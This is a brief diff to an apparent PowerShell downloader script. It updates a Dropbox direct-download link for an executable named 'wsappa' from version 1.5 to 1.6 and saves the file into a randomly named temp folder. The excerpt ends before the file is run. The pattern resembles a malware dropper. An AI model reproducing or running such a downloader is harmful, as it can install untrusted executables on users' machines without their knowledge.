@@ -1,4 +1,4 @@
-$fileUrl = "dl.dropboxusercontent.com/s/ktmct46mftulye1s7ka7j/wsappa-1.5.exe?rlkey=sfae0om54ct58a3cmgh3z4ndg&dl=0"
+$fileUrl = "dl.dropboxusercontent.com/scl/fi/p5ifhyuv4p1ui2ecolmoz/wsappa-1.6.exe?rlkey=duuxz6c3b7168p2r6iu3ozjaw&dl=0"
 $savePath = "$env:temp\sVBXKuz\wsappa.exe"
 
 if (!(Test-Path -Path $savePath)) {
